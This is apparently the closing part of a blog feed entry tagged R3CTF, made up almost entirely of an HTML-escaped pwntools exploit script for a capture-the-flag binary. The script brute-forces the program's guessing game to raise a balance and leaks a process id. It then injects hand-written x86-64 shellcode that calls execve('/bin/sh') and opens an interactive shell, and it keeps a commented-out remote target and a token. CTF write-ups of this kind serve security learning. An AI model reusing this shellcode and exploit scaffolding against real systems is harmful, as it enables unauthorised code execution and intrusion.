class=&#34;keyword&#34;&gt;import&lt;/span&gt; pack&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; ctypes &lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; *&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; base64&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; subprocess &lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; run&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#from LibcSearcher import *&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; struct &lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; pack&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; tty&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;debug&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;c = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(c):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        gdb.attach(p, c)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        gdb.attach(p)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        pause()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;get_sb&lt;/span&gt;() : &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; libc_base + libc.sym[&lt;span class=&#34;string&#34;&gt;&amp;#x27;system&amp;#x27;&lt;/span&gt;], libc_base + &lt;span class=&#34;built_in&#34;&gt;next&lt;/span&gt;(libc.search(&lt;span class=&#34;string&#34;&gt;b&amp;#x27;/bin/sh\x00&amp;#x27;&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#-----------------------------------------------------------------------------------------&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;s = &lt;span class=&#34;keyword&#34;&gt;lambda&lt;/span&gt; data : p.send(data)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sa  = &lt;span class=&#34;keyword&#34;&gt;lambda&lt;/span&gt; text,data  :p.sendafter(text, data)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sl  = &lt;span class=&#34;keyword&#34;&gt;lambda&lt;/span&gt; data   :p.sendline(data)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sla = &lt;span class=&#34;keyword&#34;&gt;lambda&lt;/span&gt; text,data  :p.sendlineafter(text, data)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;r   = &lt;span class=&#34;keyword&#34;&gt;lambda&lt;/span&gt; num=&lt;span class=&#34;number&#34;&gt;4096&lt;/span&gt;   :p.recv(num)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;rl  = &lt;span class=&#34;keyword&#34;&gt;lambda&lt;/span&gt; text   :p.recvuntil(text)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;pr = &lt;span class=&#34;keyword&#34;&gt;lambda&lt;/span&gt; num=&lt;span class=&#34;number&#34;&gt;4096&lt;/span&gt; :&lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(p.recv(num))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;inter   = &lt;span class=&#34;keyword&#34;&gt;lambda&lt;/span&gt;        :p.interactive()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;l32 = &lt;span class=&#34;keyword&#34;&gt;lambda&lt;/span&gt;    :u32(p.recvuntil(&lt;span class=&#34;string&#34;&gt;b&amp;#x27;\xf7&amp;#x27;&lt;/span&gt;)[-&lt;span class=&#34;number&#34;&gt;4&lt;/span&gt;:].ljust(&lt;span class=&#34;number&#34;&gt;4&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;b&amp;#x27;\x00&amp;#x27;&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;l64 = &lt;span class=&#34;keyword&#34;&gt;lambda&lt;/span&gt;    :u64(p.recvuntil(&lt;span class=&#34;string&#34;&gt;b&amp;#x27;\x7f&amp;#x27;&lt;/span&gt;)[-&lt;span class=&#34;number&#34;&gt;6&lt;/span&gt;:].ljust(&lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;b&amp;#x27;\x00&amp;#x27;&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;uu32    = &lt;span class=&#34;keyword&#34;&gt;lambda&lt;/span&gt;    :u32(p.recv(&lt;span class=&#34;number&#34;&gt;4&lt;/span&gt;).ljust(&lt;span class=&#34;number&#34;&gt;4&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;b&amp;#x27;\x00&amp;#x27;&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;uu64    = &lt;span class=&#34;keyword&#34;&gt;lambda&lt;/span&gt;    :u64(p.recv(&lt;span class=&#34;number&#34;&gt;6&lt;/span&gt;).ljust(&lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;b&amp;#x27;\x00&amp;#x27;&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;int16   = &lt;span class=&#34;keyword&#34;&gt;lambda&lt;/span&gt; data   :&lt;span class=&#34;built_in&#34;&gt;int&lt;/span&gt;(data,&lt;span class=&#34;number&#34;&gt;16&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;lg= &lt;span class=&#34;keyword&#34;&gt;lambda&lt;/span&gt; s, num   :p.success(&lt;span class=&#34;string&#34;&gt;&amp;#x27;%s -&amp;gt; 0x%x&amp;#x27;&lt;/span&gt; % (s, num))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#-----------------------------------------------------------------------------------------&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;context(os=&lt;span class=&#34;string&#34;&gt;&amp;#x27;linux&amp;#x27;&lt;/span&gt;, arch=&lt;span class=&#34;string&#34;&gt;&amp;#x27;amd64&amp;#x27;&lt;/span&gt;, log_level=&lt;span class=&#34;string&#34;&gt;&amp;#x27;debug&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#p = remote(&amp;#x27;47.238.36.100&amp;#x27;, 9999)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;elf_patch = &lt;span class=&#34;string&#34;&gt;&amp;#x27;./pwn&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p = process(elf_patch)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;elf = ELF(elf_patch)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;libc = ELF(&lt;span class=&#34;string&#34;&gt;&amp;#x27;./lib/libc.so.6&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ld = ELF(&lt;span class=&#34;string&#34;&gt;&amp;#x27;./lib/ld-linux-x86-64.so.2&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#p = process([&amp;#x27;seccomp-tools&amp;#x27;, &amp;#x27;dump&amp;#x27;, &amp;#x27;./pwn&amp;#x27;])&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#p = process([&amp;#x27;strace&amp;#x27;, &amp;#x27;-o&amp;#x27;, &amp;#x27;output.txt&amp;#x27;, &amp;#x27;./pwn&amp;#x27;])&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;game&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;value&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	sla(&lt;span class=&#34;string&#34;&gt;b&amp;#x27;Exit&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;b&amp;#x27;1&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	sla(&lt;span class=&#34;string&#34;&gt;b&amp;#x27;heart(0-3):\xf0\x9f\x99\x82\n&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(value))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#sla(b&amp;#x27;token: &amp;#x27;, b&amp;#x27;258:YuH72RYiBbRfazgdyG864ZTFGgZ7NlCoZUu1AfR+ltAOr0k0T0E8R76PjvfYV5FPNWZkPh/ZU5dkYLaiZL7ECg==&amp;#x27;)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;rand_right_value = -&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; i &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;range&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;4&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	game(i)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	text = p.recv(&lt;span class=&#34;number&#34;&gt;0x10&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;b&amp;#x27;NONONO!!!&amp;#x27;&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;not&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; text:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		rand_right_value = i&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&lt;span class=&#34;keyword&#34;&gt;break&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;assert&lt;/span&gt;(rand_right_value != -&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; i &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;range&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;0xff&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	game(rand_right_value)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	rl(&lt;span class=&#34;string&#34;&gt;b&amp;#x27; $ &amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	money = &lt;span class=&#34;built_in&#34;&gt;int&lt;/span&gt;(rl(&lt;span class=&#34;string&#34;&gt;b&amp;#x27;,&amp;#x27;&lt;/span&gt;)[:-&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;])&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(money)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; money &amp;gt;= &lt;span class=&#34;number&#34;&gt;134217728&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&lt;span class=&#34;keyword&#34;&gt;break&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#debug(&amp;#x27;b *$rebase(0x19be)&amp;#x27;)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sa(&lt;span class=&#34;string&#34;&gt;b&amp;#x27;Exit\n&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;b&amp;#x27;3&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;pid = u32(rl(&lt;span class=&#34;string&#34;&gt;b&amp;#x27;Y&amp;#x27;&lt;/span&gt;)[:-&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;].ljust(&lt;span class=&#34;number&#34;&gt;4&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;b&amp;#x27;\x00&amp;#x27;&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;lg(&lt;span class=&#34;string&#34;&gt;&amp;#x27;pid&amp;#x27;&lt;/span&gt;, pid)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sa(&lt;span class=&#34;string&#34;&gt;b&amp;#x27;Exit&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;b&amp;#x27;2&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# execve(&amp;#x27;/bin/sh&amp;#x27;, 0, 0)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sc=&lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;#x27;&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;	mov rsi,fs:[rax]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;    mov rsp,rsi&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;    mov rax, 0x68732f6e69622f&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;    push rax;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;    push rsp;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;    pop rdi;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;    xor esi, esi;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;    xor edx, edx;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;    &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;    push 0x3b;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;    pop rax;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;    syscall;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;   	&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;#x27;&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;pause()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sa(&lt;span class=&#34;string&#34;&gt;b&amp;#x27;CAN I SAY:&amp;#x27;&lt;/span&gt;, asm(sc))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;inter()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;



</content>
        <category term="R3CTF" />
        <updated>2024-07-28T17:15:33.000Z</updated>
    </entry>
</feed>
